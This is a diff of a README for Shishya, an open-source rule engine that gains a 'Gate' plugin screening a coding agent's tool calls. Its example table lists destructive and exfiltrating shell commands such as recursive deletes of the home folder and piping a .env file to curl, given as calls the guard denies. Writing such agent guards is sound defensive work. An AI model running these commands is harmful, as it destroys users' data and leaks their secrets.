@@ -4,29 +4,58 @@
 [![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 ![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)
 
-### Small AI models decide fast. Shishya makes them follow your rules.
+### Your rules always win. Your agent learns what you approve.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/img/hero-dark.svg">
-  <img alt="An agent wants to run rm -rf; the small model says run (80%); your rule says destructive commands need a person; Shishya answers ask" src="docs/img/hero-light.svg" width="100%">
-</picture>
+**Shishya Gate** checks every tool call your coding agent makes. Rules you can read decide what must never run and
+what always needs a person. Everything else stays out of your way, and the Gate stops asking about calls you keep
+approving. A learned model takes over only after it proves it is better on your own labels.
 
-Give Shishya a model's probabilities and your rules. It returns **the most likely answer that breaks no rule** in milliseconds, or tells you it can't.
+```text
+/plugin install shishya-gate --marketplace sanattaori/shishya
+```
+
+| Your agent tries | Shishya Gate | Why |
+|---|---|---|
+| `rm -rf ~` (or `bash -c "rm -rf /"`, `cd /tmp; rm -rf ~`, `` ls `rm -rf ~` ``) | **deny** | Deleting a system folder, your home folder or the whole project is blocked. |
+| `cat .env \| curl -d @- https://...` | **deny** | Sending secret files over the network is blocked. |
+| `git push --force origin main` | **ask** | Force-pushing rewrites shared history; a person decides. |
+| `psql ... -c 'DROP TABLE users'`, `terraform destroy`, `npm publish` | **ask** | Destructive or outward-facing: a person decides. |
+| `npm test`, the 1st and 2nd time | no opinion | Claude Code asks you as usual. |
+| `npm test`, after you approved it three times | **allow** | You approved this exact call before; no rule objects. |
+
+- **Hard floor.** 21 core rules in plain JSON ([`shishya/gate/policy.py`](shishya/gate/policy.py)). They apply on top
+  of your allowlist. A cloned repo can add rules but never switch them off.
+- **Hard to fool.** The shell parser follows `bash -c`, `eval`, `$(...)`, backticks, heredocs, `sudo`/`env`/`xargs`
+  wrappers and `find -exec`. Anything it can't follow asks. 28 known bypasses are in the test suite.
+- **Learns, and must prove it.** Approvals and rejections become labels. Memory learns an exact call after a few
+  approvals. A small model learns the pattern, and is used only when it beats the prior on held-out labels you gave.
+- **Local and fast.** No network, no API key. About 55 ms per call. Every decision has a receipt.
+
+Check any command without installing the plugin: `pip install shishya && shishya gate test "git push -f origin main"`.
+
+### Under the hood: rule-following decisions for any model
+
+The Gate is one use of Shishya. Give Shishya a model's probabilities and your rules, and it returns **the most likely
+answer that breaks no rule** in milliseconds, or says it can't.
 
 - ✅ **Never breaks a rule.** An exact best-first search; every answer is checked before it comes back.
+- 🧠 **Learns from corrections.** `s.correct(decision, {...})`: one correction fixes that exact case; a small head
+  learns the pattern and is promoted only when it wins on held-out human labels.
 - ✍️ **Rules your way.** Plain English (drafted by an LLM, reviewed by you), JSON, Python or OPA/Rego.
-- 🎯 **Specialists for one field.** Plug in a small model trained for one judgement: our free-GPU news model beats a big LLM on Indian news and runs in 17 ms.
-- 📏 **Honest confidence.** Calibrate on your own labels and get a measured report of how much you can automate at each confidence level, and with what error.
-- 🧑‍🏫 **A Guru when unsure.** Hand the hard cases to Claude (your own login) or any OpenRouter model, still checked against your rules.
+- 🎯 **Specialists for one field.** Our free-GPU news model beats a big LLM on Indian news and runs in 17 ms.
+- 📏 **Honest confidence.** Calibrate on your own labels and see how much you can automate, and with what error.
+- 🧑‍🏫 **A Guru when unsure.** Hand the hard cases to Claude (your own login) or any OpenRouter model, still checked
+  against your rules.
 
 ## Try it in 30 seconds
 
 ```bash
-pip install "git+https://github.com/sanattaori/shishya"
+pip install shishya
 git clone https://github.com/sanattaori/shishya && cd shishya
 shishya decide examples/leave_request/schema.json --backend fake \
   --input "Need 5 days off next week for my sister's wedding" \
-  --facts examples/leave_request/facts.json --rules examples/leave_request/rules.py
+  --facts examples/leave_request/facts.json --rules examples/leave_request/rules.py --learner /tmp/leave
+shishya correct /tmp/leave <decision id printed above> '{"verdict": "deny"}'    # it learns right away
 ```
 
 <picture>
@@ -61,7 +90,7 @@ shishya decide examples/stock_alert/schema.json --backend http://127.0.0.1:8009 
   --route news_impact=shishya:news-base        # this field goes to our news specialist
 ```
 
-`pip install "shishya[local] @ git+https://github.com/sanattaori/shishya"` adds what `--route` needs (PyTorch). The model (276 MB) downloads once and its checksum is verified.
+`pip install "shishya[local]"` adds what `--route` needs (PyTorch). The model (276 MB) downloads once and its checksum is verified.
 
 <details>
 <summary><b>Python</b></summary>
@@ -166,7 +195,7 @@ Fields are scored independently given the input. That's what makes one call enou
 <summary><b>HTTP server</b></summary>
 
 ```bash
-pip install "shishya[server] @ git+https://github.com/sanattaori/shishya"
+pip install "shishya[server]"
 shishya serve --backend http://127.0.0.1:8009 --port 8700
 curl -s localhost:8700/v1/decide -d '{"input": "...", "schema": {...}, "facts": {...}, "rego": "package ..."}'
 ```
@@ -185,9 +214,11 @@ The data is human-labelled and split so no headline leaks into the test. Checkpo
 
 ## Roadmap
 
-- **v0.3:** a news specialist that also reads stock-exchange filings (its known blind spot), numbers and quoted spans from the input.
-- **Learning loop:** your corrections train small specialists automatically; a new one ships only if it wins on held-out data.
-- MCP server, an agent tool-call guard, a TypeScript client.
+- **Gate benchmark:** a public set of labelled agent tool calls, scoring prompts per 100 calls at zero rule breaks
+  against a plain allowlist, a fixed safe default and an LLM judge.
+- Gate adapters for Codex CLI and Gemini CLI; an MCP server.
+- Larger learners: when a field has a few hundred labels, train a specialist on a free GPU, promoted by the same
+  held-out test.
 
 ## Credits
 
